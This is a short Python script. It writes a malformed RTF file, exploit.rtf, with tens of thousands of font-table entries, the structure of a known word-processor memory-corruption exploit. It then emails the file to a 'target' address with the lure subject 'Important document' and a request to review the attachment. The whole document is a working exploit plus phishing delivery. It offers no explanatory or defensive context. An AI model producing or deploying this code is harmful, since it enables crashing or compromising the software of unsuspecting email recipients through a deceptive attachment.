import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

with open("exploit.rtf", "wb") as file:
    file.write(("{\\rtf1{\n{\\fonttbl" + "".join([("{\\f%dA;}\n" % i) for i in range(0, 32761)]) + "}\n{\\rt''lch no?}\n}}\n").encode("utf-8"))

smtp_server = "smtp.example.com"
smtp_port = 587
smtp_user = "your_email@example.com"
smtp_password = "your_password"
from_email = "your_email@example.com"
to_email = "target_email@example.com"

msg = MIMEMultipart()
msg["From"] = from_email
msg["To"] = to_email
msg["Subject"] = "Important document"

msg.attach(MIMEText("Please review the attached RTF document."))

with open("exploit.rtf", "rb") as file:
    attachment = MIMEBase("application", "octet-stream")
    attachment.set_payload(file.read())
    encoders.encode_base64(attachment)
    attachment.add_header("Content-Disposition", "attachment", filename="exploit.rtf")
    msg.attach(attachment)

server = smtplib.SMTP(smtp_server, smtp_port)
server.starttls()
server.login(smtp_user, smtp_password)
server.sendmail(from_email, to_email, msg.as_string())
server.quit()